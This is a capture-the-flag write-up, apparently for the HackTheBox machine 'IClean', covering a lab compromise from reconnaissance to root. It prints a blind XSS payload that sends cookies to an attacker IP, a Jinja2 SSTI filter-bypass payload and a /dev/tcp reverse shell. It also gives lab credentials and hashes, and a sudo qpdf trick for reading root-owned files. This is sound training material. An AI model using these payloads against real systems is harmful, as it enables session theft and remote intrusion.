 
## Reconnaissance

### nmap 

![](./IMG/0.png)
### Gobuster 

![](./IMG/1.png)

![](./IMG/2.png)

### WebService 

> Top Page

![](./IMG/3.png)

> With gobuster result, the interesting path as follow
> /dashboard --> Credential is necessary

![](./IMG/4.png)

> /quote --> This is the only page that I can input value

![](./IMG/5.png)

> Inspect the request from /quote page
> The request success, it won't show anything different but the following message 

```
Your quote request was sent to our management team. They will reach out soon via email. Thank you for the interest you have shown in our services.
```

![](./IMG/7.png)

![](./IMG/6.png)

> Using some special character on service column, but there is no any response will show in web page.

![](./IMG/8.png)

![](./IMG/10.png)

![](./IMG/9.png)


## Exploit 

> Since it will handle the email in backend, and It has opportunity that backend manager will receive the content with the value of service column.
> Hence, I will try blind injection (blind xss).

- [Testing for blind XSS](https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation/xss/testing-for-blind-xss)

> Payload 

```
<img src=x onerror=fetch('http://10.10.14.207/?c='+document.cookie);>
```

![](./IMG/13.png)

> URL Encoding

```
%3c%69%6d%67%20%73%72%63%3d%78%20%6f%6e%65%72%72%6f%72%3d%66%65%74%63%68%28%27%68%74%74%70%3a%2f%2f%31%30%2e%31%30%2e%31%34%2e%32%30%37%2f%3f%63%3d%27%2b%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%29%3b%3e
```

![](./IMG/11.png)

> Check simple http server 
> I will receive a session cookie 

![](./IMG/12.png)

> Using this value, I can access to /dashboard

![](./IMG/15.png)

![](./IMG/14.png)

> There are some other service open 

1. Generate Invoice 
2. Generate QR 
3. Edit Service 
4. Quote Requests 

> Enumerate all the service. 
> The Generate invoice will provide a invoice number 

![](./IMG/17.png)

![](./IMG/18.png)

![](./IMG/20.png)

> With this number, I can generate a invoice link which include detail of invoice content and a "QR code"

![](./IMG/19.png)

![](./IMG/21.png)

![](./IMG/22.png)

![](./IMG/23.png)

> After enumeration the parameter, 
> I can find that the "qr_link" has  SSTI vulnerability

![](./IMG/16.png)

> Identified Template framework - jinja2 or Twig

![](./IMG/25.png)

> Check the following cheat sheet
> I tried to exploit and get RCE from SSTI 

```
{{config.items()}}
```

![](./IMG/24.png)

> Check the following infromation 

- [(HackTricks)SSTI (Server Side Template Injection)](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)

![](./IMG/26.png)
> RCE payload 
![](./IMG/27.png)

> RCE Escaping 

![](./IMG/28.png)

- [(GITHUB)WEB CTF CheatSheet](https://github.com/w181496/Web-CTF-Cheatsheet?tab=readme-ov-file#flaskjinja2)
- [(PayloadAllthething)Server Side Template Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2)

![](./IMG/29.png)

![](./IMG/30.png)

![](./IMG/31.png)

![](./IMG/32.png)

> Try above RCE payload, all of them will response 500 server error

![](./IMG/34.png)
![](./IMG/35.png)

![](./IMG/36.png)
![](./IMG/37.png)


> I noticed the filter bypass 
![](./IMG/33.png)

> Try using the payload related to filter bypass
> The command - 'id' will be executed

```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

![](./IMG/38.png)

> Try to generate reverse shell

```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('/bin/bash+-c+"/bin/bash+-i+>%26+/dev/tcp/10.10.14.207/1337+0>%261"')|attr('read')()}}
```

![](./IMG/39.png)

> Get shell

![](./IMG/40.png)

![](./IMG/41.png)

## Privilege Escalation to low-privilege user 

> Enumerate the file app.py
> There is a db config information

```
iclean / pxCsmnGLckUb
```

![](./IMG/42.png)

> Check /etc/passwd

![](./IMG/43.png)

> Check network status 

![](./IMG/44.png)

> Connect to DB

![](./IMG/45.png)

> Enumerate the DB

![](./IMG/46.png)

> Find credential 

```
admin / 2ae316f10d49222f369139ce899e414e57ed9e339bb75457446f2ba8628a6e51
consuela / 0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa
```

![](./IMG/47.png)

![](./IMG/48.png)
### hashcat bruteforce attack

> Idnetified the hash type
> SHA-256

```
hash-identifier <hash value>
```

![](./IMG/49.png)

> Admin part will failed, only consuela's hash can be cracked 

```
consuela / simple and clean
```


![](./IMG/50.png)

> SSH login with above credential 

![](./IMG/51.png)

> Confirm current user 

![](./IMG/52.png)

> User flag 

![](./IMG/53.png)

## Privilege Escalation 

> Sudo permission 

![](./IMG/54.png)

> How to use qpdf 

![](./IMG/55.png)

> Research qpdf 

```
PDF transformation software
The qpdf program is used to convert one PDF file to another equivalent PDF file.  It is capable of performing a variety of transformations such as linearization (also known as web optimization or fast web viewing), encryption, and decryption of PDF files.  It also has many options for inspecting o
```

1. [Running qpdf](https://qpdf.readthedocs.io/en/10.6/cli.html)
2. [What is QPDF?](https://qpdf.sourceforge.io/)
3. [qpdf - Man Page](https://www.mankier.com/1/qpdf#ATTACHMENTS_(work_with_embedded_files))

> Usage 

![](./IMG/56.png)

> With usage list, I can create aa pdf file by --empty 

![](./IMG/60.png)

> Usage format 
```
qpdf --empty <input file name> -- <outputfile name>
```

> Idea: 
> Create a pdf file with empty
> Add root.txt as  attachment into this pdf
> List the attachments in this pdf
> Show the attachments 

![](./IMG/57.png)

![](./IMG/58.png)

![](./IMG/59.png)

> Root flag step 

1. attach file 
```
sudo /usr/bin/qpdf --empty --add-attachment /root/root.txt -- ./root.pdf
strings root.pdf
```
![](./IMG/61.png)

2. List attachment

```
sudo /usr/bin/qpdf --list-attachments root.pdf
```
![](./IMG/62.png)

3. Show attachment 

```
sudo /usr/bin/qpdf --show-attachment=root.txt root.pdf
```

![](./IMG/63.png)

## Reference 

### Discussion 

1. [Official IClean Discussion](https://forum.hackthebox.com/t/official-iclean-discussion/310738)
### blind XSS

1. [Testing for blind XSS](https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation/xss/testing-for-blind-xss)
2. [(GITHUB)XSS payloadlist](https://github.com/payloadbox/xss-payload-list)
3. [(GITHUB)XSSrike](https://github.com/s0md3v/XSStrike)
4. [(GITHUB)xsscrapy](https://github.com/DanMcInerney/xsscrapy)
5. [Blind Xss (A new way)](https://medium.com/@dirtycoder0124/blind-xss-a-new-way-856053d51f75)

### SSTI 

1. [(HackTricks)SSTI (Server Side Template Injection)](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
2. [(HackTricks)Jinja2 SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti)
3. [(GITHUB)WEB CTF CheatSheet](https://github.com/w181496/Web-CTF-Cheatsheet?tab=readme-ov-file#flaskjinja2)
4. [(PayloadAllthething)Server Side Template Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2)
5. [SSTI Injections Identification During Pentesting Web Applications (with exploitation example)](https://adipsharif.medium.com/ssti-injections-identification-during-pentesting-web-applications-with-exploitation-example-8523654a3ba0)
6. [[Day13 - SSTI (Server-side template injection)](https://ithelp.ithome.com.tw/articles/10244403)
### qpdf 

1. [Running qpdf]https://qpdf.readthedocs.io/en/10.6/cli.html)
2. [What is QPDF?](https://qpdf.sourceforge.io/)
3. [qpdf - Man Page](https://www.mankier.com/1/qpdf#ATTACHMENTS_(work_with_embedded_files))
### Others 

- [(HackTricks)Bypass Python sandboxes](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes)
- [Reverse Shell Generator](https://www.revshells.com/)
## Question 

1. How to identified blind XSS
2. How to identified SSTI vulnerability


###### tags: `HackTheBox`